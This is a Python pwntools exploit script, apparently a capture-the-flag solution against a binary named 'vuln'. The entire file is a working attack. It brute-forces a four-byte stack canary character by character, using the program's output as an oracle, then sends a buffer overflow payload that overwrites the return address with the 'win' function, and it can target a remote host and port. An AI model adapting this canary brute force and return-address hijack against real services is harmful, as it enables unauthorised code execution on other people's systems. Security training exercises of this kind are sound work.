#!/usr/bin/env python3
from string import ascii_letters
from pwn import *
import argparse

parser = argparse.ArgumentParser()
parser.add_argument("destination", type=str, choices={"local", "remote"})
parser.add_argument("--target", "-t", type=str, default='', required=False)
parser.add_argument("--port", "-p", type=int, default=0, required=False)
args = parser.parse_args()

elf = context.binary = ELF('./vuln')
context.log_level = "critical"

def get_process():
    if args.destination == "local":
        return process('./vuln')
    elif args.destination == "remote":
        if not args.target or not args.port:
            warning("-t for host and -p for port")
        return remote(args.target, args.port)

def find_canary():
    canary = b''
    for offset in range(1,5):
        for i in ascii_letters:
            p = get_process()
            junk = cyclic(64) + canary + i.encode('utf-8')
            payload = [
                junk
            ]
            payload = b"".join(payload)
            p.sendline(str(64+len(canary)+1))
            p.sendline(payload)
            result = p.recvall().decode(encoding='ascii')
            if "Ok... Now Where's the Flag?" in result:
                canary += i.encode("utf-8")
                print(f"[+] Canary Value {canary}")
                break
    print(f"[!]Canary Value {canary}") 
    return canary

def run():
    canary = find_canary()
    p = get_process()
    junk = cyclic(64) + canary + cyclic(16)
    flag = elf.symbols['win']
    payload = [
        junk,
        pack(flag)
    ]
    payload = b"".join(payload)
    print(p.recvuntil(b'?').decode(encoding='ascii'))
    p.sendline(b"92")
    print(p.recvuntil(b'>').decode(encoding='ascii'))
    p.sendline(payload)
    sleep(1)
    result = p.recvall().decode(encoding='ascii')
    print(result)

if __name__ == "__main__":
    run()

